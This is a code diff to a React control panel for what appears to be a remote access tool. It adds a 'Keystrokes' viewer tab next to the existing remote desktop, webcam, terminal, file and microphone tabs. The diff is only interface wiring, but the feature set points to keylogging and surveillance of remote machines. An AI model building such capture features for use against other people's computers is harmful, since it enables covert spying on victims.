@@ -15,6 +15,7 @@ import {
   FolderOpen,
   Mic,
   MapPin,
+  Keyboard,
 } from 'lucide-react'
 import { Button } from '@/components/ui/button'
 import { Input } from '@/components/ui/input'
@@ -31,9 +32,10 @@ import { WebcamView } from '@/components/webcam-view'
 import { TerminalEmulator } from '@/components/terminal-emulator'
 import { FileBrowser } from '@/components/file-browser'
 import { MicrophoneView } from '@/components/microphone-view'
+import { KeystrokeViewer } from '@/components/keystroke-viewer'
 import { toast } from 'sonner'
 
-type ToolTab = 'desktop' | 'webcam' | 'terminal' | 'files' | 'mic'
+type ToolTab = 'desktop' | 'webcam' | 'terminal' | 'files' | 'mic' | 'keystrokes'
 
 const toolTabs: { id: ToolTab; label: string; icon: typeof Monitor }[] = [
   { id: 'desktop', label: 'Desktop', icon: Monitor },
@@ -41,6 +43,7 @@ const toolTabs: { id: ToolTab; label: string; icon: typeof Monitor }[] = [
   { id: 'terminal', label: 'Terminal', icon: Terminal },
   { id: 'files', label: 'Files', icon: FolderOpen },
   { id: 'mic', label: 'Microphone', icon: Mic },
+  { id: 'keystrokes', label: 'Keystrokes', icon: Keyboard },
 ]
 
 export function ConnectionPanel() {
@@ -300,6 +303,10 @@ export function ConnectionPanel() {
 
           {activeTool === 'mic' && (
             <MicrophoneView isConnected={isConnected} serverName={selectedServer?.name} />
+          )}
+
+          {activeTool === 'keystrokes' && (
+            <KeystrokeViewer isConnected={isConnected} serverName={selectedServer?.name} />
           )}
         </div>
       )}
